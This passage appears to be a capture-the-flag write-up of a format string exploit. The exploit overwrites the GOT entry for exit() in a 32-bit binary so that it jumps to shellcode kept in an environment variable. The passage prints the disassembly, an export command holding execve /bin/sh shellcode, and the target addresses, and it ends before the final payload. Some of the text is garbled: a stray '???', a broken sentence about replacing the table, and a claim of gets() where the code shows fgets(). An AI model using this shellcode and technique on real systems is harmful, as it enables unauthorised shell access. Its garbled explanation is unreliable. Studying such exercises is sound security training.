
# Overwrite .GOT table again

On this level we are provided with a program which takes a string as input via the **`gets()`** function, in the case of uppercase alphabetic characters these are transformed into lowercase letters before being printed by **`printf()`**.

```
08048444 <main>:
...
804846e:	8d 44 24 28          	lea    eax,[esp+0x28]
8048472:	89 04 24             	mov    DWORD PTR [esp],eax
8048475:	e8 d6 fe ff ff       	call   8048350 <fgets@plt>
804847a:	c7 84 24 8c 00 00 00 	mov    DWORD PTR [esp+0x8c],0x0
...
80484f3:	f2 ae                	repnz scas al,BYTE PTR es:[edi]
80484f5:	89 c8                	mov    eax,ecx
80484f7:	f7 d0                	not    eax
80484f9:	83 e8 01             	sub    eax,0x1
80484fc:	39 c3                	cmp    ebx,eax
80484fe:	72 87                	jb     8048487 <main+0x43>
8048500:	8d 44 24 28          	lea    eax,[esp+0x28]
8048504:	89 04 24             	mov    DWORD PTR [esp],eax
8048507:	e8 34 fe ff ff       	call   8048340 <printf@plt>
```

Since no sanitize takes place on our input and it is handled by printf, we can use a **format string attack**.

???
We notice at the same time that the program will end with an **`exit()`**, the address of the latter is not yet resolved at this stage of the program, so let’s replace the . have a table

```
08048444 <main>:
...
8048513:	e8 58 fe ff ff       	call   8048370 <exit@plt>
```

Let's build our attack.

First we will inject a spawn shell code into an environment variable :

    export SHELLCODE="\x31\xc0\x31\xdb\x31\xc9\x31\xd2\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0\x0b\xcd\x80"

Now let's get the location address of the .GOT exit table & previous ENV var :

**.GOT** table addr : **`0x80497e0`**
**ENV** var addr : **`0xffffd885`** / **`4294957189`**

We notice that the address of the ENV is a very large number, we will have to divide the overwrite operation into two parts.
